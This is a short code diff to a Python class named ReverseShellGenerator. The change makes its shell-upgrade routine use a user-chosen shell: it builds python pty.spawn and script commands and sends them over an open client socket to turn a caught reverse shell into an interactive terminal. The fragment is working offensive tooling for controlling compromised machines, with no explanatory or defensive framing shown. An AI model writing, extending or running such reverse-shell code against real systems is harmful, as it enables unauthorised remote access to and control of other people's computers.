@@ -198,13 +198,16 @@ class ReverseShellGenerator:
 
     def trigger_multi_upgrade(self):
         time.sleep(0.5)
+        
+        selected_shell = self.shell_var.get()
+        
         upgrade_cmd = (
-            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
-            "python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
-            "/usr/bin/script -qc /bin/bash /dev/null\n"
+            f"python3 -c 'import pty; pty.spawn(\"{selected_shell}\")' 2>/dev/null || "
+            f"python -c 'import pty; pty.spawn(\"{selected_shell}\")' 2>/dev/null || "
+            f"/usr/bin/script -qc {selected_shell} /dev/null\n"
         )
         self.client_socket.send(upgrade_cmd.encode())
-        self.log("🚀 Shell upgraded")
+        self.log(f"🚀 Shell upgraded to {selected_shell}")
    
     def receive_data(self):
         def recv_thread():
